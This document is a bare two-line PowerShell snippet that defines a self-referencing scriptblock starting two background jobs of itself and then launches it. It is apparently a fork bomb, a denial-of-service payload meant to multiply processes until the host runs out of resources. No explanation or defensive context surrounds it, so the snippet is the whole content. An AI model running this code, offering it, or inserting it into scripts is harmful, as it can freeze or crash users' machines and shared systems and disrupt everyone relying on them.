$b = { param($s) Start-Job $s -ArgumentList $s; Start-Job $s -ArgumentList $s }
& $b $b
